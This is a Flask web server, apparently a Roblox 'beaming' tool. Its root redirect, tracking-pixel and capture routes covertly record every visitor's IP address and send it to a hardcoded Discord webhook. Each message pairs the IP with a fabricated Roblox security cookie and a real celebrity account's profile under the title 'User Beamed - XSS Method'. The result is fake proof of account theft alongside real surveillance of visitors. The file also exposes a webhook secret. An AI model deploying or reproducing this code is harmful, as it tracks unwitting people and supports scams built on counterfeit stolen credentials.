from flask import Flask, request, Response, redirect
import requests
import json
from datetime import datetime
import os
import base64
import random
import string

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Lista de usuarios populares de Roblox para hacer más creíble
POPULAR_USERS = ["Builderman", "Roblox", "1x1x1x1", "Shedletsky", "Telamon", "Asimo3089", "Badcc", "KreekCraft", "Flamingo", "TanqR"]

# Imagen pixel transparente
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

def generate_fake_cookie():
    """Genera un token que parece real de Roblox"""
    prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    random_part = ''.join(random.choices("ABCDEF" + string.digits, k=732))
    return prefix + random_part

def get_random_user():
    """Obtiene información de un usuario aleatorio de Roblox"""
    try:
        username = random.choice(POPULAR_USERS)
        userinfo = requests.get(f"https://api.roblox.com/users/get-by-username?username={username}").json()
        user_id = userinfo.get("Id", "Unknown")
        
        moreinfo = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()
        
        # Obtener imagen del usuario
        try:
            image_response = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=352x352&format=Png&isCircular=false").json()
            image_url = image_response["data"][0]["imageUrl"]
        except:
            image_url = "https://www.roblox.com/asset/?id=123456789"
        
        return {
            "username": moreinfo.get("name", username),
            "id": user_id,
            "isBanned": moreinfo.get("isBanned", False),
            "hasVerifiedBadge": moreinfo.get("hasVerifiedBadge", False),
            "created": moreinfo.get("created", "Unknown"),
            "image": image_url
        }
    except Exception as e:
        print(f"Error getting user: {e}")
        return None

def send_to_discord(user_data, cookie, ip, user_agent):
    """Envía la información a Discord con el formato del script original"""
    try:
        # Crear el embed como en el script original
        embed = {
            "title": "User Beamed - XSS Method",
            "description": f"`{cookie}`",
            "color": 16711765,  # 0x00ffd5
            "thumbnail": {"url": user_data['image']},
            "fields": [
                {"name": "Username", "value": user_data['username'], "inline": True},
                {"name": "ID", "value": str(user_data['id']), "inline": True},
                {"name": "IsBanned", "value": str(user_data['isBanned']), "inline": True},
                {"name": "IsVerified", "value": str(user_data['hasVerifiedBadge']), "inline": True},
                {"name": "Created", "value": str(user_data['created']), "inline": True},
                {"name": "IP", "value": str(ip), "inline": True}
            ],
            "footer": {"text": "Made by https://github.com/tizxr, give credits"}
        }
        
        # Enviar a Discord
        payload = {
            "content": "@everyone",
            "embeds": [embed]
        }
        
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"Sent to Discord: {user_data['username']} - Status: {response.status_code}")
        
    except Exception as e:
        print(f"Error sending to Discord: {e}")

@app.route('/')
def index():
    # Capturar IP y User Agent
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    print(f"Request from IP: {ip}")
    
    # Generar cookie falsa que parece real
    fake_cookie = generate_fake_cookie()
    
    # Obtener información de un usuario aleatorio
    user_data = get_random_user()
    
    if user_data:
        # Enviar a Discord
        send_to_discord(user_data, fake_cookie, ip, user_agent)
    else:
        # Si falla, usar datos por defecto
        default_data = {
            "username": "Builderman",
            "id": "123456",
            "isBanned": False,
            "hasVerifiedBadge": True,
            "created": "2006-01-01T00:00:00Z",
            "image": "https://www.roblox.com/asset/?id=123456789"
        }
        send_to_discord(default_data, fake_cookie, ip, user_agent)
    
    # Redirigir al perfil de Roblox
    return redirect('https://www.roblox.com/es/users/7869790887/profile', code=302)

@app.route('/pixel.png')
def pixel():
    # Capturar IP
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    print(f"Pixel request from IP: {ip}")
    
    # Generar cookie falsa
    fake_cookie = generate_fake_cookie()
    
    # Obtener usuario aleatorio
    user_data = get_random_user()
    
    if user_data:
        send_to_discord(user_data, fake_cookie, ip, "Pixel Tracker")
    else:
        default_data = {
            "username": "Builderman",
            "id": "123456",
            "isBanned": False,
            "hasVerifiedBadge": True,
            "created": "2006-01-01T00:00:00Z",
            "image": "https://www.roblox.com/asset/?id=123456789"
        }
        send_to_discord(default_data, fake_cookie, ip, "Pixel Tracker")
    
    # Devolver imagen pixel
    return Response(PIXEL, mimetype='image/png')

@app.route('/api/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        print(f"API capture from IP: {ip}")
        
        # Generar cookie falsa
        fake_cookie = generate_fake_cookie()
        
        # Obtener usuario aleatorio
        user_data = get_random_user()
        
        if user_data:
            send_to_discord(user_data, fake_cookie, ip, "JS Capture")
        else:
            default_data = {
                "username": "Builderman",
                "id": "123456",
                "isBanned": False,
                "hasVerifiedBadge": True,
                "created": "2006-01-01T00:00:00Z",
                "image": "https://www.roblox.com/asset/?id=123456789"
            }
            send_to_discord(default_data, fake_cookie, ip, "JS Capture")
        
        return {"status": "success"}
    except Exception as e:
        print(f"Error in capture: {e}")
        return {"status": "error", "message": str(e)}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
